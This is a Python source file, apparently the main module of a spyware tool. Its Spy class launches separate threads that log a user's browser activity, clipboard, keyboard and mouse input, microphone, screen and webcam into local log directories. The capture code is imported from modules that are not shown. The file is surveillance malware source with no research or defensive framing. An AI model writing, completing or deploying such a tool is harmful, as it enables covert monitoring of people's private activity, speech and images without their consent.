from threading import Thread

from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.screen_logger import ScreenLogger
from loggers.webcam_logger import WebcamLogger

from utils.utils import create_log_directories
from config import LOGS_DIRECTORY_PATH


class Spy:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
        self.loggers = []
        self.running_threads = []

    def stop_all(self):
        for logger in self.loggers:
            print("Stopped?")
            logger.running = False

    def spy(self):
        create_log_directories(self.logs_directory_path)

        browser_logger = BrowserLogger()
        clipboard_logger = ClipboardLogger()
        input_logger = InputLogger()
        microphone_logger = MicrophoneLogger()
        screen_logger = ScreenLogger()
        webcam_logger = WebcamLogger()

        self.loggers.extend([
            browser_logger,
            clipboard_logger,
            input_logger,
            microphone_logger,
            screen_logger,
            webcam_logger
        ])

        browser_thread = Thread(target=browser_logger.run)
        clipboard_thread = Thread(target=clipboard_logger.run)
        input_thread = Thread(target=input_logger.run)
        microphone_thread = Thread(target=microphone_logger.run)
        screen_thread = Thread(target=screen_logger.run)
        webcam_thread = Thread(target=webcam_logger.run)

        self.running_threads.extend([
            browser_thread,
            clipboard_thread,
            input_thread,
            microphone_thread,
            screen_thread,
            webcam_thread,
        ])

        for thread in self.running_threads:
            thread.start()

        from time import sleep
        sleep(5)
        self.stop_all()

        for thread in self.running_threads:
            thread.join()


if __name__ == "__main__":
    spy = Spy()
    spy.spy()
